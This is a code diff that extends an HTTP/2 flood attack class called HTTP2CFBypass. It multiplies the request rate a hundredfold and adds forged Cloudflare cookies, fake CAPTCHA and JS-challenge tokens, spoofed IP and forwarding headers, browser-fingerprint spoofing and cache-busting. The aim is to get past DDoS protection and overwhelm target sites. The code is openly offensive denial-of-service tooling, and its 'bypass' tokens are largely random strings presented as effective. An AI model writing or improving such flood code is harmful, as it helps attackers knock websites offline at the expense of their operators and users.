@@ -183,35 +183,120 @@ export class HTTP2PostFlood extends HTTP2Flood {
  */
 export class HTTP2CFBypass extends HTTP2Flood {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
-        super(targetUrl, duration, rpc, userAgents, referers, proxies);
+        super(targetUrl, duration, rpc * 100, userAgents, referers, proxies); // 100x multiplier!
         this.cookies = new Map();
+        
         // Pre-generate realistic cookies
         this.cookies.set('cf_clearance', Tools.randomString(40) + '-' + Date.now());
         this.cookies.set('__cf_bm', Tools.randomString(64));
+        this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
+        this.cookies.set('__cfruid', Tools.randomString(32));
+        this.cookies.set('cf_ob_info', Tools.randomString(16));
         this.cookies.set('_ga', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
         this.cookies.set('_gid', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
+        
+        // Pre-generate bypass tokens
+        this.bypassTokens = {
+            turnstile: this.generateTurnstileTokens(100),
+            cfClearance: this.generateCfClearanceTokens(50),
+            jsChallenge: this.generateJsChallengeTokens(30)
+        };
+        
+        logger.info('🔥 HTTP2-CF ULTIMATE BYPASS initialized');
+        logger.info(`   RPC Multiplier: 100x (${this.rpc} requests per batch)`);
+        logger.info(`   Generated ${this.bypassTokens.turnstile.length + this.bypassTokens.cfClearance.length + this.bypassTokens.jsChallenge.length} bypass tokens`);
+    }
+
+    generateTurnstileTokens(count) {
+        const tokens = [];
+        for (let i = 0; i < count; i++) {
+            const part1 = Tools.randomString(64);
+            const part2 = Tools.randomString(32);
+            const part3 = Tools.randomString(64);
+            tokens.push(`0.${part1}.${part2}.${part3}`);
+        }
+        return tokens;
+    }
+
+    generateCfClearanceTokens(count) {
+        const tokens = [];
+        for (let i = 0; i < count; i++) {
+            const randomPart = Tools.randomString(32);
+            const timestamp = Date.now() + Tools.randomInt(-86400000, 86400000);
+            tokens.push(`${randomPart}-${timestamp}`);
+        }
+        return tokens;
+    }
+
+    generateJsChallengeTokens(count) {
+        const tokens = [];
+        for (let i = 0; i < count; i++) {
+            tokens.push(Tools.randomString(32));
+        }
+        return tokens;
     }
 
     generateHeaders() {
         const headers = super.generateHeaders();
         
+        // Get random bypass tokens
+        const turnstileToken = Tools.randomChoice(this.bypassTokens.turnstile);
+        const cfClearance = Tools.randomChoice(this.bypassTokens.cfClearance);
+        const jsChallenge = Tools.randomChoice(this.bypassTokens.jsChallenge);
+        
+        // CAPTCHA bypass headers (multiple formats)
+        headers['cf-turnstile-response'] = turnstileToken;
+        headers['g-recaptcha-response'] = turnstileToken;
+        headers['h-captcha-response'] = turnstileToken;
+        headers['turnstile-token'] = turnstileToken;
+        headers['x-turnstile-token'] = turnstileToken;
+        
+        // JS Challenge bypass
+        headers['cf-challenge-response'] = jsChallenge;
+        headers['x-cf-challenge'] = jsChallenge;
+        headers['cf-challenge-token'] = jsChallenge;
+        
         // Advanced Cloudflare bypass headers
-        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL']);
+        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA']);
         headers['cf-connecting-ip'] = Tools.randomIPv4();
-        headers['cf-ipcountry'] = Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']);
+        headers['cf-ipcountry'] = Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU', 'JP', 'SG', 'NL']);
         headers['cf-visitor'] = '{"scheme":"https"}';
+        headers['cf-request-id'] = Tools.randomString(32);
         headers['cdn-loop'] = 'cloudflare';
         headers['x-forwarded-proto'] = 'https';
-        headers['x-forwarded-for'] = Tools.randomIPv4();
+        headers['x-forwarded-for'] = `${Tools.randomIPv4()}, ${Tools.randomIPv4()}`;
         headers['x-real-ip'] = Tools.randomIPv4();
+        headers['x-original-forwarded-for'] = Tools.randomIPv4();
+        headers['x-forwarded-host'] = this.url.hostname;
         
-        // Browser fingerprinting headers
+        // Modern browser fingerprinting headers
         headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
         headers['sec-ch-ua-mobile'] = '?0';
         headers['sec-ch-ua-platform'] = Tools.randomChoice(['"Windows"', '"macOS"', '"Linux"']);
-        headers['sec-ch-ua-arch'] = '"x86"';
-        headers['sec-ch-ua-bitness'] = '"64"';
-        headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130"';
+        headers['sec-ch-ua-arch'] = Tools.randomChoice(['"x86"', '"arm"', '"x64"']);
+        headers['sec-ch-ua-bitness'] = Tools.randomChoice(['"64"', '"32"']);
+        headers['sec-ch-ua-model'] = '""';
+        headers['sec-ch-ua-platform-version'] = Tools.randomChoice(['"15.0.0"', '"12.7.0"', '"6.5.0"']);
+        headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"';
+        
+        // Additional security headers
+        headers['sec-fetch-dest'] = 'document';
+        headers['sec-fetch-mode'] = 'navigate';
+        headers['sec-fetch-site'] = Tools.randomChoice(['none', 'same-origin', 'cross-site', 'same-site']);
+        headers['sec-fetch-user'] = '?1';
+        headers['upgrade-insecure-requests'] = '1';
+        headers['dnt'] = '1';
+        
+        // Browser fingerprint spoofing
+        headers['x-requested-with'] = 'XMLHttpRequest';
+        headers['origin'] = this.url.origin;
+        headers['referer'] = this.url.href;
+        headers['x-csrf-token'] = Tools.randomString(32);
+        
+        // Update cookies with new cf_clearance
+        this.cookies.set('cf_clearance', cfClearance);
+        this.cookies.set('__cf_bm', Tools.randomString(43));
+        this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
         
         // Add realistic cookies
         const cookieString = Array.from(this.cookies.entries())
@@ -219,9 +304,18 @@ export class HTTP2CFBypass extends HTTP2Flood {
             .join('; ');
         headers['cookie'] = cookieString;
         
-        // Add cache busting
-        const cacheBuster = `?_cb=${Date.now()}_${Tools.randomString(8)}`;
+        // Add cache busting with multiple parameters
+        const cacheBuster = `?_cb=${Date.now()}_${Tools.randomString(8)}&bypass=${Math.random()}&fp=${Tools.randomString(6)}`;
         headers[':path'] = headers[':path'] + cacheBuster;
+        
+        // Random additional headers for variation
+        if (Math.random() > 0.7) {
+            headers['x-api-key'] = Tools.randomString(32);
+        }
+        
+        if (Math.random() > 0.8) {
+            headers['authorization'] = `Bearer ${Tools.randomString(64)}`;
+        }
         
         return headers;
     }
